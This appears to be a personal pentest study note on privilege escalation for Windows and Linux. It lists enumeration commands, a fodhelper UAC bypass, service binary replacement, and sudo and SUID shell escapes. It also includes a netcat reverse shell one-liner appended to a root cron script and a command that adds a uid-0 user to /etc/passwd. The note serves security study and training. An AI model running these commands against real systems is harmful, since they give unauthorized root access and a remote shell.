# manual enumeration

## whoami
* Works on linux and windows ``whoami``
* on windows you can use the name to execute ``net user bo112``
* on linux we can use the ``id`` command we get userid and group id number

To identify high priviledge user accounts for targeting: 
* to check other users on system on windows we can run ``net user``
* on linux we can check other users by reading content from ``cat /etc/passwd``

## enumerating host names
can ofter give clues about it roles (often includes abbreviation db, web, etc.)
* run ``hostname``

## enumerating operating systems
sometimes we need to rely on kernel exploits (depends on version)
* on windows: ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``
* on linux: ``cat /etc/*-release`` & ``uname -a`` to find the kernel version

## enumerating running procecces and services
processes & services might have insufficient permissions
* on windows: ``tasklist /SVC``
* on linux - lists all processes in contrast to windows: ``ps axu``

## enumerating networking information
* on windows ``ipconfig /all`` && ``route print`` && ``netstat -ano`` (a all active tcp)
* on linux: ``ip a`` or ``ipconfig a`` && ```/sbin/route`` (or route l) && ``ss -anp``

## enumerating firewall status and rules
* on win: ``netsh advfirewall show currentprofile``
* on win: list all firewall rules ``netsh advfirewall firewall show rule name=all``
* on linux: ``grep -Hs iptables /etc/*``

## enumerating scheduled tasks
might have insecure permissions
* on win to check when tasks are running (daily, weekly,etc): ``schtasks /query /fo LIST /v``
* on linux for daily ``/etc/cron.daily``, weekly ``/etc/cron.daily``, etc. check also ``/etc/crontab`` where system admin add their own schedulers (check also permissions)

## sudo rights 
`sudo -l` => if you have root rights for some programs like for instance msfconsole you then act as root with sudo msfconsole;
`find / -perm /4000` => enumerating files with SUID access from root directory


## enumerate installed application and versions
* on win: ``wmic product get name, version, vendor`` only lists application that are installed by the windows installer
* on win for system wide updates to check for security updates: ``wmic qfe get Caption, Description, HotfixID, InstalledOn`` (check also for last updates, if the system has not been updated recently might be hackable)
* debian: ``dpkg -l`` redhat different 

## enumarating readable/writeable files and directories
* on windows (file needs to be downloaded first): accesschk.exe -uws "Everyone" "C:/Program Files"
* or via powershell ``Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sMondify"}`` enumerate everything under the program files and check for access for everyone group
* On linux: ``find / -writeable -type d 2>/dev/null``

## enumarating unmounted discs
* on windows: ``mountvol`` (check for no mount points)
* on linux: ``mount`` && ``cat /etc/fstab`` && ``/bin/lsblk``

# enumerating device driver and kernel modules
once we know the versions we can look for exports targeting those driver versions
* on win to see a list of loaded drivers: ``powershell`` => ``driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path``
* on win to also get version numbers: ``Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}``
* on lin: ``lsmod`` => then we can use f.i.: to enumerate version for the package "libata": ``/sbin/modinfo libata``
* also on win ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``

# enumerating binaries that autoElevate
* on win ``reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer`` OR ``reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer`` is some of those are enabled any user can run windows installer packages with elevated priviledges
* Baniary is owned by root and has the suid bit set any user can execute this binary with elevating priviledges ``find / -perm -u=s -type f 2>/dev/null``, f.e.: if the copy command is suid set then we can copy to senenstive files

# automated enumeration

*Try this one: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS*

doing it manually takes too much time, thankfully can be automated, check [win-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
On linux: f.e.: https://github.com/leonteale/pentestpackage/blob/master/web_shells/unix-privesc-check
Automated good but it is important to watch out for manual configuration!

# User Account Control
on win user gets accesstoken for applications and also check for integrety is being performed (we either need to type user name and pw or consent when for instance doing important operations, like changing the pw)
* open cmd and type ``whoami /groups``, we see in type label "Verbindliche Beschriftung\Mittlere Verbindlichkeitsstufe" => we can't change a pw on medium lvl (cmd)
* ``powershell.exe Start-Process cmd.exe -Verb runAs`` after giving cosent we are presented with a new high integrity process, there we can change the pw ``net user admin someNewPw``

## User account control bypass
Allows admin user to do some hight integrity actions by bypassing integrity levels
* Using ``C:\Windows\System32\fodhelper.exe`` target win 10 build 17.09 (specific build)
* We start this binary and inspect the manifest with ``sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe`` we see that Admin is requited but it can auto elevate integrity
* Start process monitor: ``procmon.exe``
=> check further on pdf or videoP
* we changed registries (there for instance information is stored on how to start a program)
* we adjusted a registry to execute shell and then we gained the high integritiy cmd

# insecure file permissions
When devs are not properly handling permissions (assigning Full access to all users). Program could then be replaced with a malicous one having full access.
Look for paths like: ``C:\Program Files\`` where software devs control the structure. More prone to this type of vuln.

* on win type: ``Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`` check for services which are installed in the program file directory (is user installed and more prone to this)
* Check: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls && the program you want to check permissions for: ``icacls "C:\Program Files\Serviio\bin\ServiioService.exe"``. Outcome ``BUILTIN\Users:(I)(F)`` allows any user read or write access => voln
* we can replace this service with our binary
* Create exe out of [scripts/pricEsc/addUserC] by ``i686-w64-mingw32-gcc adduser.c -o adduser.exe``
* with ftp we put this file on the target machine and replace the ServioService.exe
* but we need to restart the service somehow (otherwise it will not work)
* we check first the start mode ``wmic service where caption="Serviio" get name, caption, state, startmode`` => end get info on if it is running and if the StartMode is on auto (will automatically start on system restart), so we might restart Serviio by restarting the system
* check if the current user has rights to restart the system ``whoami /priv`` => if shutdownPriviledge is shown then we have the rights to do it (otherwise it would not be listed in the list and we would need to wait until someone else restarts the system manually)
* reboot system ``shutdown /r /t 0``
* Now we should be able to login into the machine with the "evil" account and local admin group (``net localgroup Administrators``) with rhost for instance

## Leveraging Unquoted Service Paths
A dev might forgot to quote due to empty space ``C:\Program Files directory`` leaving room for attack.

For example, imagine that we have a service stored in a path such as C:\Program Files\My
Program\My Service\service.exe. If the service path is stored unquoted, whenever Windows starts
the service it will attempt to run an executable from the following paths:

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe

In this example, Windows will search each “interpreted location” in an attempt to find a valid
executable path.

For example, we could name our executable Program.exe and place it in C:\Program Files\My Program in our example)
or subdirectory (C:\Program Files\My Program\My service)

## Windows kernel vuln
Use this when not other option left!
* Anayse first system: ``systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"``
* As such, we should always attempt to investigate this attack surface first before resorting to more difficult attacks ``driverquery /v``, check 3rd party drivers (even if it marks at stopeed because it is loaded in the memory kernel space)
* we can check searchsploit for driver but check version, drivers, etc.
* Check in program files where the program is located the version 
* Then compile prgram and transfer it to windows 

# Linux
On linux everything is a file which has write, read and execute. 

## insuficient file permisssion
In order to leverage insecure file permissions, we must locate an executable file that not only allows us write access but also runs at an elevated privilege level. On a Linux system, the cron543 timebased job scheduler is a prime target, as system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

* run to check cronjobs ``grep "CRON" /var/log/cron.log``
Output: ...
Jan27 17:45:01 victim CRON[2615]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:50:01 victim CRON[2631]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 17:55:01 victim CRON[2656]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
Jan27 18:00:01 victim CRON[2671]:(root) CMD (cd /var/scripts/ && ./user_backups.sh)
* user_backups.sh under */var/scripts/* is executed in the context of the *root user*
* Check content: ``cat /var/scripts/user_backups.sh`` and permission ``ls -lah /var/scripts/user_backups.sh``
* Since an unprivileged user can modify the contents of the backup script, we can edit it and add a reverse shell one-liner ``echo >> user_backup.sh`` && ``echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh``
* Open nc reverese shell in kali => and once this CJ runs we should have root acccess shell


## Insecure File Permissions: /etc/passwd Case Study
Linux passwords are generally stored in `/etc/shadow`, which is not readable by normal users. Historically however, password hashes, along with other account information, were stored in the world-readable file `/etc/passwd`

* `/etc/passwd` if available is firstly taken over `/etc/shadow`
* if availabe, can create a pw in hash `openssl passwd evil` generate typically something like `AK24fcSx2Il3I`
* put root 2 users into `etc/passwd` => `echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd`
* then you might login as this user: `su root2`


## Exploiting services which are running as root
*Exploiting any service which is running as root will give you Root!* Example MySQL

* ``netstat -antup`` – It shows you all the ports which are open and are listening. We can check for services which are running locally if they could be exploited or not.
* `ps -aux | grep root` – It shows us the services which are running as root.
* One of the biggest mistake web admins do, is to run a webserver with root privilege. A command injection vulnerability on the web application can lead an attacker to root shell. This is a classic example of why you should never run any service as root unless really required.
*Never run any service as root unless really required, especially web, database and file servers.*

## Exploiting SUID Executables
SUID which stands for set user ID, is a Linux feature that allows users to execute a file with the permissions of a specified user. For example, the Linux ping command typically requires root permissions in order to open raw network sockets. By marking the ping program as SUID with the owner as root, ping executes with root privileges anytime a low privilege user executes the program.

* when `ls -la` a file you might see `rwsr-xr-x–` The *‘s’* character instead of ‘x’ indicates that the SUID bit is set
* `find / -perm -u=s -type f 2>/dev/null`- It prints the executables which have SUID bit set
* For example if nmap or python is enabled we might get root `nmap –interactive` – runs nmap interactive mode

    SUID bit should not be set to any program which lets you escape to the shell.
    You should never set SUID bit on any file editor/compiler/interpreter as an attacker can easily read/overwrite any files present on the system.

## Exploiting SUDO rights/user
If the attacker can’t directly get root access via any other techniques he might try to compromise any of the users who have SUDO access.
A classic example of this is assigning SUDO rights to the find command so that another user can search for particular files/logs in the system. While the admin might be unaware that the ‘find’ command contains parameters for command execution, an attacker can execute commands with root privilege.

* `sudo -l` – Prints the commands which we are allowed to run as SUDO
* f.e.: We can run find, cat and python as SUDO. These all commands will run as root when run with SUDO => `sudo find /home -exec sh -i \;` – find command’s exec parameter can be used for arbitrary code execution or with pyhton to get bash `sudo python3 -c 'import pty;pty.spawn("/bin/bash");'` – spawns a shell

> Never give SUDO rights to any of the programming language compiler, interpreter and editors.
> This technique can also be applied to vi, more, less, perl, ruby, gdb and others

## Exploiting users with ‘.’ in their PATH
Having ‘.’ in your PATH means that the user is able to execute binaries/scripts from the current directory. To avoid having to enter those two extra characters every time, the user adds ‘.’ to their PATH. This can be an excellent method for an attacker to escalate his/her privilege

Let’s say Susan is an administrator and she adds ‘.’ in her path so that she doesn’t have to write the 2 characters again.

With ‘.’ in path – program
Without ‘.’ in path – ./program

## Kernel exploits 
use this if other things not possible

